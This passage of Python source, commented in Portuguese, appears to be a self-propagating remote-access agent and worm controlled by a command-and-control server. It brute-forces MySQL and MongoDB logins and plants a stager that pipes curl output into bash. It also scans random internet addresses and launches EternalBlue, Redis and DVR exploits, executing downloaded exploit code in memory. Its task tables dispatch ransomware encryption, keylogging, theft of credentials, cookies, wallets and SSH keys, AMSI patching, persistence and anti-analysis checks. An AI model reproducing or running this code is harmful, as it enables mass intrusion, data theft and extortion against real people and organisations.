    except ImportError:
        log_fn(f"[MYSQL] pymysql nao disponivel — worker ignorado.")
        return False

    port = 3306
    for user, pwd in credentials:
        try:
            conn = pymysql.connect(
                host=target_ip, port=port, user=user, password=pwd,
                connect_timeout=4, read_timeout=4
            )
            log_fn(f"[MYSQL] {target_ip}:{port} — login OK: {user}:{pwd}")
            try:
                cur = conn.cursor()
                stager_cmd = f"SELECT '#!/bin/bash\\ncurl -s {stager_url} | bash\\n' INTO OUTFILE '/tmp/stager_m.sh'"
                cur.execute(stager_cmd)
                conn.commit()
                log_fn(f"[MYSQL] {target_ip}:{port} — stager escrito via SELECT INTO OUTFILE.")
            except Exception as e:
                log_fn(f"[MYSQL] {target_ip}:{port} — login OK mas nao foi possivel escrever stager: {e}")
            finally:
                conn.close()
            return True
        except Exception:
            pass

    log_fn(f"[MYSQL] {target_ip}:{port} — sem acesso.")
    return False


def _worker_mongodb(target_ip: str, credentials: list, stager_url: str, log_fn):
    """
    Tenta conexão no MongoDB via pymongo (importação opcional).
    Mongo sem auth: serverStatus retorna documento — basta conectar.
    """
    try:
        import pymongo
        from pymongo.errors import OperationFailure, ServerSelectionTimeoutError
    except ImportError:
        log_fn(f"[MONGO] pymongo nao disponivel — worker ignorado.")
        return False

    port = 27017
    # Tenta sem autenticação primeiro
    try:
        client = pymongo.MongoClient(
            host=target_ip, port=port, serverSelectionTimeoutMS=3000, connectTimeoutMS=3000
        )
        client.admin.command("ping")
        log_fn(f"[MONGO] {target_ip}:{port} — acesso sem autenticacao.")
        try:
            db = client["pwned"]
            db["stager"].insert_one({"url": stager_url, "note": "lab"})
            log_fn(f"[MONGO] {target_ip}:{port} — documento inserido em pwned.stager.")
        except Exception as e:
            log_fn(f"[MONGO] {target_ip}:{port} — conectado mas insert falhou: {e}")
        client.close()
        return True
    except Exception:
        pass

    # Tenta com credenciais
    for user, pwd in credentials:
        if not pwd:
            continue
        try:
            uri = f"mongodb://{user}:{pwd}@{target_ip}:{port}/admin?serverSelectionTimeoutMS=3000"
            client = pymongo.MongoClient(uri, connectTimeoutMS=3000)
            client.admin.command("ping")
            log_fn(f"[MONGO] {target_ip}:{port} — autenticado: {user}:{pwd}")
            client.close()
            return True
        except Exception:
            pass

    log_fn(f"[MONGO] {target_ip}:{port} — sem acesso.")
    return False


# ==============================================================================
# DISPATCHER — mapeia porta aberta para o worker correto
# ==============================================================================

PORT_WORKER_MAP = {
    22:   _worker_ssh,
    21:   _worker_ftp,
    445:  _worker_smb,
    23:   _worker_telnet,
    6379: _worker_redis,
    3306: _worker_mysql,
    27017: _worker_mongodb,
}
 
def propagation_worker_v2(
    target_ip:   str,
    open_ports:  list,
    c2_base_url: str,
    stop_event:  threading.Event,
    log_fn=None,
    credentials: list = None,
):
    """
    Worker de propagação v2.
 
    Para cada porta aberta no alvo, tenta o protocolo correspondente
    com a lista de credenciais. Ao primeiro sucesso, para (não tenta
    outros protocolos para o mesmo alvo).
 
    Args:
        target_ip:   IP do alvo.
        open_ports:  Lista de portas abertas detectadas pelo scan_and_exploit.
        c2_base_url: URL base do C2 (ex: https://c2.exemplo.com).
        stop_event:  Event para interromper o worker externamente.
        log_fn:      Função de log (aceita qualquer callable).
        credentials: Lista de (user, pwd). Usa DEFAULT_CREDENTIALS se None.
    """
    if log_fn is None:
        log_fn = lambda msg: None  # fallback silencioso
 
    if credentials is None:
        credentials = DEFAULT_CREDENTIALS
 
    # URL pública do stager — sem auth, o alvo comprometido baixa direto.
    # /stager/ serve apenas drone.sh e drone_agent.py (whitelist no servidor).
    stager_url = urljoin(c2_base_url, "/stager/drone.sh")
 
    # Ordena as portas pela prioridade de exploração
    # SSH > SMB > Telnet > FTP (SSH dá mais controle, FTP é mais limitado)
    priority_order = [22, 445, 23, 21]
    sorted_ports = sorted(
        open_ports,
        key=lambda p: priority_order.index(p) if p in priority_order else 99
    )
 
    for port in sorted_ports:
        if stop_event.is_set():
            return
 
        worker_fn = PORT_WORKER_MAP.get(port)
        if not worker_fn:
            continue  # porta sem worker definido
 
        log_fn(f"[PROPAGATION] {target_ip}:{port} — tentando {worker_fn.__name__}")
 
        try:
            success = worker_fn(target_ip, credentials, stager_url, log_fn)
            if success:
                log_fn(f"[PROPAGATION] {target_ip} COMPROMETIDO via porta {port}.")
                return  # sucesso — não tenta outros protocolos no mesmo alvo
        except Exception as e:
            log_fn(f"[PROPAGATION] Erro no worker para {target_ip}:{port}: {e}")
 
    log_fn(f"[PROPAGATION] {target_ip} — nenhuma credencial funcionou.")

def start_worm_mode(args):
    """
    MÓDULO DE CAÇA (WORM) v3.3 - Wordlist customizável + semáforo de exploits.

    Novos args opcionais:
      wordlist: lista de strings "user:pass" ou lista de listas [["user","pass"]]
                Se omitido, usa DEFAULT_CREDENTIALS.
    """
    try:
        duration_minutes = int(args.get("duration_minutes", 60))
        target_list_str = args.get("targets", None)
        ports_str_arg = args.get("ports", None)
        sync_mode = args.get("sync_mode", False)

        # --- Wordlist customizável ---
        raw_wordlist = args.get("wordlist", None)
        custom_creds = None
        if raw_wordlist:
            custom_creds = []
            for entry in raw_wordlist:
                try:
                    if isinstance(entry, str) and ":" in entry:
                        u, p = entry.split(":", 1)
                        custom_creds.append((u.strip(), p.strip()))
                    elif isinstance(entry, (list, tuple)) and len(entry) == 2:
                        custom_creds.append((str(entry[0]), str(entry[1])))
                except Exception:
                    pass
            report_worm_activity(f"Wordlist customizada carregada: {len(custom_creds)} entradas.", level="WORM_LOG")

        mode_name = "Sincrono (Analise)" if sync_mode else "Assíncrono (Rapido)"
        report_worm_activity(f"Modo de Caca ativado em modo: {mode_name}", level="WORM_LOG")

        def hunter_thread_logic():
            stop_time = time.time() + duration_minutes * 60
            
            if target_list_str:
                # --- MODO DIRECIONADO ---
                write_internal_log(f"INFO: [MODO CAÇA - DIRECIONADO] Iniciado. Alvos brutos: {target_list_str}")
                report_worm_activity(f"Modo Caça (Direcionado) ativado. Alvos: {target_list_str}", level="WORM_LOG")
                
                # --- INÍCIO DA CORREÇÃO ---
                initial_targets = [t.strip() for t in target_list_str.replace(',', ' ').split() if t.strip()]
                expanded_targets = []
                
                for item in initial_targets:
                    try:
                        # Tenta interpretar o item como uma rede (ex: 192.168.1.0/24)
                        network = ipaddress.ip_network(item, strict=False)
                        # Adiciona todos os IPs válidos da rede à lista final
                        for ip in network.hosts():
                            expanded_targets.append(str(ip))
                        report_worm_activity(f"Bloco/IP '{item}' expandido para {len(list(network.hosts()))} hosts.", level="WORM_LOG")
                    except ValueError:
                        # Se não for uma rede, trata como um único IP
                        expanded_targets.append(item)

                report_worm_activity(f"Total de {len(expanded_targets)} alvos individuais para escanear.", level="WORM_LOG")
                
                # Itera sobre a lista de IPs JÁ EXPANDIDA
                for target_ip in expanded_targets:
                    if time.time() > stop_time:
                        break
                    scan_args = {
                        "targets": [target_ip],
                        "ports": ports_str_arg,
                        "sync_mode": sync_mode,
                        "credentials": custom_creds,
                    }
                    scan_and_exploit(scan_args)
                    time.sleep(0.5)
                # --- FIM DA CORREÇÃO ---

            else:
                # --- MODO GLOBAL (WORM) ---
                write_internal_log(f"INFO: [MODO CACA - GLOBAL] Iniciado por {duration_minutes} minutos.")
                report_worm_activity(f"Modo Caca (Global/Worm) ativado por {duration_minutes} minutos.", level="WORM_LOG")

                while time.time() < stop_time:
                    first_octet = random.choice([i for i in range(1, 224) if i not in [10, 127, 172, 192]])
                    target_ip = f"{first_octet}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                    scan_args = {
                        "targets": [target_ip],
                        "ports": ports_str_arg,
                        "sync_mode": sync_mode,
                        "credentials": custom_creds,
                    }
                    scan_and_exploit(scan_args)
                    time.sleep(1)
            
            write_internal_log("INFO: [MODO CAÇA] Duração concluída. Finalizando.")
            report_worm_activity("Módulo de Caça concluído.", level="WORM_LOG")

        main_hunter_thread = threading.Thread(target=hunter_thread_logic)
        main_hunter_thread.daemon = True
        main_hunter_thread.start()

        msg = f"SUCESSO: Módulo de Caça ativado por {duration_minutes} minutos."
        return msg, "info"

    except Exception as e:
        error_msg = f"ERRO: Falha ao iniciar o Módulo de Caça: {e}"
        write_internal_log(error_msg)
        return error_msg, "error"



def parse_ports(ports_arg, default_ports):
    """
    Interpreta a string de portas fornecida pelo operador.
    Retorna uma lista de inteiros representando as portas a serem escaneadas.
    """
    # Se nenhum argumento de porta foi passado (None ou string vazia), usa a lista padrão.
    if not ports_arg:
        write_internal_log(f"[parse_ports] Nenhuma porta especificada. Usando lista padrão com {len(default_ports)} portas.")
        return default_ports

    ports_arg = ports_arg.lower().strip()
    write_internal_log(f"[parse_ports] Processando argumento de portas: '{ports_arg}'")

    # Caso especial para 'all'
    if ports_arg == "all":
        write_internal_log("[parse_ports] Palavra-chave 'all' detectada. Escaneando todas as 65535 portas.")
        return list(range(1, 65536))

    # Usamos um 'set' para evitar portas duplicadas e depois o convertemos para uma lista ordenada.
    final_ports = set()
    
    # Divide a string por vírgulas para lidar com múltiplas entradas (ex: "80, 443, 1000-2000")
    parts = ports_arg.split(',')

    for part in parts:
        part = part.strip()
        if '-' in part:
            # É uma faixa (ex: "1-1024")
            try:
                start, end = map(int, part.split('-'))
                # Validação para garantir que a faixa é lógica e dentro dos limites de portas.
                if 0 < start <= end < 65536:
                    final_ports.update(range(start, end + 1))
            except ValueError:
                # Ignora faixas mal formatadas como "80-abc"
                write_internal_log(f"[parse_ports] AVISO: Faixa de porta mal formatada ignorada: '{part}'")
                continue
        else:
            # É uma porta única
            try:
                port = int(part)
                # Validação para garantir que a porta está dentro dos limites.
                if 0 < port < 65536:
                    final_ports.add(port)
            except ValueError:
                # Ignora portas inválidas como "abc"
                write_internal_log(f"[parse_ports] AVISO: Entrada de porta inválida ignorada: '{part}'")
                continue
    
    # Converte o set para uma lista e a ordena para um scan sequencial.
    sorted_ports = sorted(list(final_ports))
    write_internal_log(f"[parse_ports] Lista final de portas processada: {len(sorted_ports)} portas.")
    return sorted_ports



def scan_and_exploit(args):
    """
    Versão 4.3 - "Nmap Style"
    - Corrige o erro 'list index out of range'.
    - Loga o banner completo do serviço para análise detalhada.
    """
    try:
        write_internal_log(f"[scan_and_exploit] Argumentos recebidos: {args}")

        target_ips = args.get("targets", [])
        ports_str_arg = args.get("ports", None)
        sync_mode = args.get("sync_mode", False)
        custom_creds = args.get("credentials", None)  # wordlist customizada passada pelo worm

        default_ports_list = [21, 22, 23, 25, 26, 53, 55, 59, 80, 443, 445, 3306, 6379, 8080, 7443, 8443, 9090, 9999, 3389, 27017]
        ports_to_scan = parse_ports(ports_str_arg, default_ports_list)

        write_internal_log(f"[scan_and_exploit] Portas a serem escaneadas: {ports_to_scan}")

        if not target_ips:
            return "Erro: Nenhuma lista de alvos fornecida.", "error"

        # Busca o mapa de vulnerabilidades do C2 (sua lógica está correta)
        base_url = SERVER_URL.split('/api')[0] if '/api' in SERVER_URL else SERVER_URL
        map_url = urljoin(base_url, "/api/get_vuln_map")
        headers = get_authenticated_headers()
        response = requests.get(map_url, headers=headers, timeout=10)
        response.raise_for_status()
        vuln_map = response.json()
        
        windows_smb_exploits = ["ms08_067_netapi.py", "ms17_010_eternalblue.py"]
        generic_probe = b"\r\n\r\n"

        write_internal_log(f"[scan_and_exploit] Iniciando loop para os alvos: {target_ips}")

        _seen_ips = set()
        for ip in target_ips:
            if ip in _seen_ips:
                write_internal_log(f"[scan_and_exploit] IP duplicado ignorado: {ip}")
                continue
            _seen_ips.add(ip)
            write_internal_log(f"--- [WORM] Analisando Alvo: {ip} ---")
            report_worm_activity(f"Analisando alvo: {ip}", level="WORM_LOG")
            found_open_ports = [] 

            for port in ports_to_scan:
                report_worm_activity(f"--> {ip}:{port}: Verificando...", level="WORM_LOG")
                
                try:
                    def launch_exploit(exploit_args):
                        """Função auxiliar para decidir como lançar o exploit."""
                        if sync_mode:
                            report_worm_activity(f"--> {ip}:{port}: Executando exploit '{exploit_args['exploit_script']}' em modo SINCRONO...", level="WORM_VULN")
                            run_exploit(exploit_args)
                        else:
                            report_worm_activity(f"--> {ip}:{port}: Disparando exploit '{exploit_args['exploit_script']}' em modo ASSÍNCRONO...", level="WORM_VULN")
                            def _guarded_exploit(_args=exploit_args):
                                _WORM_EXPLOIT_SEM.acquire()
                                try:
                                    run_exploit(_args)
                                finally:
                                    _WORM_EXPLOIT_SEM.release()
                            threading.Thread(target=_guarded_exploit, daemon=True).start()

                    # Lógica de scan e detecção de banner (sem alterações)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(2.0); s.connect((ip, port))
                    banner = ""; 
                    try:
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                        if not banner: s.send(generic_probe); banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                    except socket.timeout: pass
                    finally: s.close()
                    
                    found_open_ports.append(port)
                    # --- INÍCIO DA MODIFICAÇÃO ---
                    
                    # Limpa o banner de caracteres não imprimíveis para um log limpo
                    clean_banner = ''.join(c for c in banner if c.isprintable()).strip()

                    # VERIFICA SE O BANNER NÃO ESTÁ VAZIO ANTES DE USÁ-LO
                    if clean_banner:
                        # Loga o banner completo tanto no painel quanto no arquivo interno
                        log_message = f"--> {ip}:{port}: [ABERTA] Banner: {clean_banner}"
                        report_worm_activity(log_message, "WORM_LOG")
                        write_internal_log(f"[WORM-SCAN] {log_message}")
                    else:
                        # Se não houver banner, apenas informa que a porta está aberta
                        log_message = f"--> {ip}:{port}: [ABERTA] Conexão bem-sucedida, mas serviço silencioso."
                        report_worm_activity(log_message, "WORM_LOG")
                        write_internal_log(f"[WORM-SCAN] {log_message}")

                    # --- LÓGICA DE AÇÃO (Usa o clean_banner) ---
                    
                    if port == 6379:
                        launch_exploit({"target_ip": ip, "exploit_script": "redis_unauth_cron.py"})

                    elif port == 445:
                        for exploit_script in windows_smb_exploits:
                            launch_exploit({"target_ip": ip, "exploit_script": exploit_script})
                            if not sync_mode: time.sleep(1)
                    
                    elif port == 80:
                        # A sua lógica original para a porta 80 já chama um exploit específico,
                        # então vamos mantê-la.
                        launch_exploit({"target_ip": ip, "exploit_script": "dvr_shell_injection.py"})

                    # A checagem do mapa de vulnerabilidades agora usa o 'clean_banner'
                    if clean_banner:
                        for banner_key, exploit_script in vuln_map.items():
                            if banner_key.lower() in clean_banner.lower():
                                # Evita chamar o exploit de DVR duas vezes se a porta for 80
                                if exploit_script == "dvr_shell_injection.py" and port == 80: continue
                                
                                launch_exploit({"target_ip": ip, "exploit_script": exploit_script})
                                break # Para após encontrar a primeira correspondência
                    
                    # --- FIM DA MODIFICAÇÃO ---

                except (socket.timeout, ConnectionRefusedError, OSError):
                    pass # Porta fechada, continua silenciosamente para a próxima
                except Exception as e:
                    error_msg = f"--> {ip}:{port}: ERRO inesperado durante o scan: {e}"
                    write_internal_log(f"[WORM-ERROR] {error_msg}")
                    report_worm_activity(error_msg, level="WORM_LOG")

            # ← ADICIONAR ESTE BLOCO (mesmo nível do for port, dentro do for ip)
            if found_open_ports:
                report_worm_activity(
                    f"[PROPAGATION] {ip} — {len(found_open_ports)} porta(s) abertas. "
                    f"Iniciando propagation_worker_v2...",
                    level="WORM_LOG"
                )
                prop_stop = threading.Event()
                threading.Thread(
                    target=propagation_worker_v2,
                    args=(ip, found_open_ports, base_url, prop_stop, report_worm_activity, custom_creds),
                    daemon=True
                ).start()
        
        return "Sub-rotina de varredura concluída.", "info"

    except Exception as e:
        import traceback
        error_msg = f"Erro crítico no orquestrador de exploração: {e}\n{traceback.format_exc()}"
        write_internal_log(error_msg)
        return error_msg, "error"




def run_exploit(args):
    """
    Orquestrador de Exploração (v2.4 - hybrid_log segura)
    - hybrid_log definida ANTES do try para estar acessível no except.
    - Proteção contra args None ou sem as chaves esperadas.
    """
    # Proteção contra args None ou inválido
    exploit_script_name = args.get("exploit_script", "N/A") if args else "N/A"
    _target = args.get("target_ip", "N/A") if args else "N/A"

    # Define hybrid_log ANTES do try para que o except tenha acesso garantido.
    # Se args for inválido, usa "N/A" como target para não quebrar o log.
    def hybrid_log(message):
        """
        Função de log híbrida.
        1. Escreve no log interno do agente.
        2. Envia para o painel do worm em tempo real.
        """
        log_message = str(message)
        write_internal_log(log_message)
        if AGENT_ID:
            report_worm_activity(f"--> {_target}: {log_message}", "EXPLOIT_LOG")

    try:
        # Validação dos argumentos — agora feita dentro do try com hybrid_log já disponível
        if not args or not args.get("target_ip") or exploit_script_name == "N/A":
            return "Argumentos 'target_ip' e 'exploit_script' são necessários.", "error"

        target_ip = args.get("target_ip")

        hybrid_log(f"--- INÍCIO DO PROCESSO DE EXPLORAÇÃO: {exploit_script_name} ---")
        hybrid_log(f"[ALVO] IP do alvo definido como: {target_ip}")

        from urllib.parse import urljoin
        base_url = SERVER_URL.split('/api')[0] if '/api' in SERVER_URL else SERVER_URL

        # --- ETAPA 1: MONTAR URL PÚBLICA DO STAGER ---
        # /stager/ é uma rota pública — o alvo comprometido baixa sem auth.
        # drone.sh: stager bash que baixa e executa drone_agent.py.
        # drone_agent.py: mini-agente Linux que faz beacon para /drone/*.
        # /stager/drone.sh é servido pelo servidor com C2_URL já injetado.
        # O alvo baixa e executa — drone.sh é o agente completo (bash puro).
        payload_url = urljoin(base_url, "/stager/drone.sh")
        hybrid_log(f"[PASSO 1/3] Payload URL (drone bash): {payload_url}")

        # --- ETAPA 2: BAIXAR O SCRIPT DE EXPLOIT (autenticado) ---
        exploit_url = urljoin(base_url, f"/exploits/{exploit_script_name}")
        hybrid_log(f"[PASSO 2/3] Baixando exploit '{exploit_script_name}' de: {exploit_url}")

        exploit_headers = get_authenticated_headers()
        response_exploit = requests.get(exploit_url, headers=exploit_headers, timeout=30)
        response_exploit.raise_for_status()
        exploit_code = response_exploit.text
        hybrid_log(f"[SUCESSO] Exploit baixado ({len(exploit_code)} bytes).")

        # --- ETAPA 3: EXECUTAR O EXPLOIT EM MEMÓRIA ---
        # Assinatura padrão: run(target_ip, payload_url, log_function)
        # payload_url é a URL que o ALVO vai usar para baixar o drone — sem auth necessária.
        hybrid_log(f"[PASSO 3/3] Executando exploit em memória...")
        exploit_globals = {}
        exec(exploit_code, exploit_globals)

        if 'run' in exploit_globals and callable(exploit_globals['run']):
            hybrid_log(f"[INFO] Invocando run()...")
            exploit_globals['run'](
                target_ip=target_ip,
                payload_url=payload_url,
                log_function=hybrid_log
            )
        else:
            raise RuntimeError(f"O exploit '{exploit_script_name}' nao define funcao run().")

        hybrid_log(f"--- FIM DO PROCESSO DE EXPLORAÇÃO: {exploit_script_name} ---")
        return f"Processo de exploração contra {target_ip} concluído.", "info"

    except Exception as e:
        import traceback
        error_msg = f"Erro crítico durante a exploração com '{exploit_script_name}': {e}"
        hybrid_log(error_msg)
        hybrid_log(f"Traceback: {traceback.format_exc()}")
        hybrid_log(f"--- PROCESSO DE EXPLORAÇÃO FALHOU: {exploit_script_name} ---")
        return error_msg, "error"




def spawn_process(command):
    """
    Inicia um processo em segundo plano ('fire and forget') sem capturar sua saída.
    Útil para iniciar aplicações GUI ou processos de longa duração.
    """
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return f"Processo para o comando '{command}' iniciado em segundo plano com sucesso.", "info"
    except Exception as e:
        return f"Falha ao iniciar o processo em segundo plano: {e}", "error"



def send_result(task_id, result_data, data_type):
    if not AGENT_ID:
        return {"status": "invalid_identity"}
    
    payload = {"agent_id": AGENT_ID, "task_id": task_id, "data_type": data_type, "result": result_data}
    
    try:
        # 1. Prepara o payload
        payload_json = json.dumps(payload)
        encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
        if not encrypted_payload:
            write_internal_log("Falha ao CRIPTOGRAFAR resultado da tarefa.")
            return {"status": "encryption_failed"}

        # 2. Converte para bytes (o que realmente será enviado)
        payload_bytes = encrypted_payload.encode('utf-8')

        # 3. GERA A ASSINATURA USANDO OS BYTES CORRETOS
        # Este é o passo crucial. A assinatura é criada para o corpo exato da requisição.
        auth_headers = get_authenticated_headers(payload_bytes)

        # 4. Envia a requisição — tenta SERVER_URL e todos os fallbacks
        response = _http_post_with_fallback("/task_result", payload_bytes, auth_headers, timeout=20)

        # 5. Processa a resposta
        if response.status_code == 200:
            response_data = _decode_encrypted_json_response(response, "task_result")
            if not response_data or response_data.get("status") != "success":
                write_internal_log("Confirmação de resultado inválida; preservando para retry.")
                queued = _queue_push(task_id, result_data, data_type)
                return {"status": "queued" if queued else "queue_failed"}
            # Aproveita uma conexão bem-sucedida para replay da fila offline
            _queue_replay()
            return {"status": "delivered"}
        else:
            write_internal_log(f"[ERRO] /task_result retornou status {response.status_code}.")
            if _response_disposition(response.status_code) == "permanent":
                return {"status": "permanent_failure", "http_status": response.status_code}
            queued = _queue_push(task_id, result_data, data_type)
            return {"status": "queued" if queued else "queue_failed"}

    except Exception as e:
        write_internal_log(f"Erro ao enviar resultado: {type(e).__name__}")
        # Armazena na fila offline para reenvio posterior
        queued = _queue_push(task_id, result_data, data_type)
        return {"status": "queued" if queued else "queue_failed"}



# Tarefas que rodam em Threads (longa duração)
THREADED_TASKS = {
    "encrypt": encrypt_files_on_target,
    "decrypt_target": decrypt_files_on_target,
    "network_scan": scan_internal_network,
    "start_attack": start_attack,
    "run_exploit": run_exploit,
    "start_worm_mode":  start_worm_mode,
    "capture_audio":    capture_audio,
}

# Tarefas Síncronas (execução rápida, retornam dados)
SYNC_TASKS = {
    "webcam_snap": capture_webcam_image,
    "ransom_note": show_ransom_note,
    "keylogger_start": start_keylogger,
    "keylogger_stop": stop_keylogger,
    "download": download_from_target,
    "screenshot": capture_screenshot,
    "sysinfo": capture_system_info,
    "cookies": capture_cookies,
    "processes": capture_process_info,
    "credentials": capture_credentials,
    "shell": execute_shell_command,
    "persist": establish_persistence,
    "start_listener": start_pivot_listener,
    "kill": kill_process,
    "elevate": elevate_privileges,
    "remote_exec": remote_wmi_exec,
    "spawn": spawn_process,
    "upload": upload_to_target,
    "network_recon": capture_network_info,
    "wifi_passwords": capture_wifi_passwords,
    "lateral_psexec": lateral_psexec,
    "clipboard":            capture_clipboard,
    "clipboard_monitor":    start_clipboard_monitor,
    "clipboard_monitor_stop": stop_clipboard_monitor,
    "session_export":       export_browser_sessions,
    "token_impersonation":  token_impersonation,
    "revert_token":         revert_token,
    "amsi_patch":           patch_amsi,
    "credentials_firefox":  capture_firefox_credentials,
    "credential_manager":   capture_credential_manager,
    "ssh_keys":             capture_ssh_keys,
    "env_tokens":           capture_env_tokens,
    # --- Coleta expandida (🟢) ---
    "browser_history":      capture_browser_history,
    "rdp_credentials":      capture_rdp_credentials,
    "crypto_wallets":       capture_crypto_wallets,
    "installed_software":   capture_installed_software,
    "network_shares":       capture_network_shares,
    "recent_files":         capture_recent_files,
    "vpn_configs":          capture_vpn_configs,
    "ad_info":              capture_ad_info,
    "password_managers":    capture_password_managers,
}

# scan_exploit adicionado após sua definição para evitar NameError
SYNC_TASKS["scan_exploit"] = scan_and_exploit

def set_beacon_timing(args):
    """
    Altera BEACON_INTERVAL e BEACON_JITTER em runtime via comando C2.
    args: "interval=15 jitter=0.4"  ou apenas "15" (so altera interval)
    Retorna mensagem de confirmacao.
    OPSEC: permite ao operador aumentar o intervalo apos comprometimento
    para reduzir ruido de rede sem recompilar o agente (T1071).
    """
    global BEACON_INTERVAL, BEACON_JITTER
    try:
        parts = str(args or '').strip().split()
        for part in parts:
            if '=' in part:
                k, v = part.split('=', 1)
                if k.strip() == 'interval':
                    BEACON_INTERVAL = max(1, int(float(v.strip())))
                elif k.strip() == 'jitter':
                    BEACON_JITTER = max(0.0, min(1.0, float(v.strip())))
            else:
                # Valor avulso = so o interval
                BEACON_INTERVAL = max(1, int(float(part)))
        low  = round(BEACON_INTERVAL * (1 - BEACON_JITTER), 1)
        high = round(BEACON_INTERVAL * (1 + BEACON_JITTER), 1)
        pct  = int(BEACON_JITTER * 100)
        return (
            "Beacon atualizado: interval=" + str(BEACON_INTERVAL) + "s jitter=" + str(pct) + "% "
            "(range " + str(low) + "s - " + str(high) + "s)",
            "info"
        )
    except Exception as e:
        return f"Erro ao definir beacon: {e}", "error"


# set_beacon_timing e adicionado apos sua definicao para evitar NameError
SYNC_TASKS["set_beacon"] = set_beacon_timing

# Tarefas que rodam e não retornam nada (o agente sai ou elas não têm "resultado")
NO_RETURN_TASKS = {
     "cleanup": cleanup_and_self_destruct,
     # 'sleep' e tratado separadamente no loop
}

def run_threaded_task(target_function: callable, args: any, result_container: list):
    """
    Executa a função alvo e armazena o resultado em um container (lista).
    """
    try:
        result_data, data_type = target_function(args)
        if result_data is not None:
            result_container.append((result_data, data_type))
    except Exception as e:
        error_message = f"Erro na execução da thread: {type(e).__name__}"
        result_container.append((error_message, "error"))

# Em agent.py

def main_loop():
    write_internal_log("Entrando no loop principal (v3.1 - Híbrido)")
    
    active_threads = {}  # Dicionário para rastrear threads: {task_id: (thread, container)}

    while True:
        # --- PARTE 1: VERIFICAR THREADS CONCLUÍDAS ---
        # Esta parte é do seu novo loop e é excelente, vamos mantê-la.
        completed_tasks = []
        for task_id, (thread, result_container) in active_threads.items():
            if not thread.is_alive():
                if result_container: # Se a lista não estiver vazia
                    result_data, data_type = result_container[0]
                    send_result(task_id, result_data, data_type)
                else:
                    # A thread terminou mas não produziu resultado (pode ter tido um erro interno)
                    send_result(task_id, "Tarefa concluída sem resultado explícito.", "info")
                completed_tasks.append(task_id)
        
        for task_id in completed_tasks:
            del active_threads[task_id]

        # --- PARTE 2: OBTER E DESPACHAR NOVA TAREFA ---
        if len(active_threads) >= MAX_ACTIVE_TASKS:
            _beacon_sleep()
            continue

        task = get_task()
        if not task:
            _beacon_sleep()
            continue

        if task.get("_control") == "reregister":
            return "reregister"

        command = task.get("command")
        task_id = task.get("task_id")
        args = task.get("args")
        write_internal_log(f"Tarefa recebida: id={task_id or 'control'} command={command}")
        
        result_data = None
        data_type = "generic_result"

        try:
            # Lógica de despacho explícita, inspirada no seu loop antigo
            if command in THREADED_TASKS:
                if task_id in active_threads:
                    result_data, data_type = "Erro: Tarefa com este ID já está em execução.", "error"
                else:
                    target_func = THREADED_TASKS[command]
                    result_container = []
                    thread = threading.Thread(target=run_threaded_task, args=(target_func, args, result_container))
                    thread.daemon = True
                    thread.start()
                    active_threads[task_id] = (thread, result_container)
                    # O resultado final será enviado somente após a thread terminar.
                    continue

            elif command in SYNC_TASKS:
                target_func = SYNC_TASKS[command]
                result_data, data_type = target_func(args)

            elif command in NO_RETURN_TASKS:
                target_func = NO_RETURN_TASKS[command]
                target_func(task_id, args) # Chama a função (ex: cleanup)
                # Se a função não sair, o loop continua. Se sair (sys.exit), o programa termina aqui.
                continue # Pula o send_result, pois não há o que enviar

            # Tratamento especial para 'sleep' pode ser útil
            elif command == "sleep":
                sleep_duration = int(args) if args else BEACON_INTERVAL
                time.sleep(sleep_duration)
                result_data, data_type = f"Sleep de {sleep_duration}s concluído.", "info"

            else:
                result_data, data_type = f"Comando desconhecido ou não mapeado: '{command}'", "error"

        except Exception as e:
            error_message = f"Erro ao processar comando '{command}': {type(e).__name__}"
            write_internal_log(f"[TASK_ERROR] id={task_id} command={command} error={type(e).__name__}")
            result_data, data_type = error_message, "error"

        # Envia o resultado apenas se houver algo para enviar
        if task_id:
            send_result(task_id, result_data, data_type)





if __name__ == "__main__":
    try:
        initialize_globals()
    except Exception:
        sys.exit(1)

    try:
        if getattr(sys, 'frozen', False):
            os.chdir(os.path.dirname(sys.executable))
        else:
            os.chdir(os.path.dirname(os.path.abspath(__file__)))
        write_internal_log(f"Diretório de trabalho definido para: {os.getcwd()}")
    except Exception as e:
        write_internal_log(f"Falha ao definir o diretório de trabalho: {e}")

    write_internal_log(f"--- INÍCIO DA EXECUÇÃO DO AGENTE (Versão: {AGENT_VERSION}) ---")

    self_install_and_persist()
    
    if anti_analysis_checks():
        write_internal_log("Ambiente suspeito detectado. Encerrando.")
        sys.exit(0)
    
    write_internal_log("Iniciando loop de registro perpétuo.")
    
    # --- INÍCIO DA MELHORIA DE RESILIÊNCIA ---
    # Este loop agora é infinito e mais robusto. Ele só será interrompido
    # se o main_loop() for chamado e, por algum motivo, encerrar.
    while True:
        if register_with_c2():
            write_internal_log("Registro bem-sucedido. Entrando no loop principal de tarefas.")
            loop_result = main_loop()
            if loop_result == "reregister":
                AGENT_ID = None
                time.sleep(1)
                continue
            # Se, por qualquer motivo extraordinário, o main_loop() terminar,
            # o 'break' abaixo garante que o script do agente encerre em vez de
            # tentar se registrar novamente.
            write_internal_log("[CRITICAL] O loop principal de tarefas foi encerrado. O agente vai parar.")
            break
        else:
            # Se o registro falhar (por timeout, erro de rede, etc.),
            # ele loga, espera um tempo aleatório e tenta novamente, para sempre.
            sleep_time = random.randint(30, 60)
            write_internal_log(f"Falha no registro. Tentando novamente em {sleep_time} segundos.")
            time.sleep(sleep_time)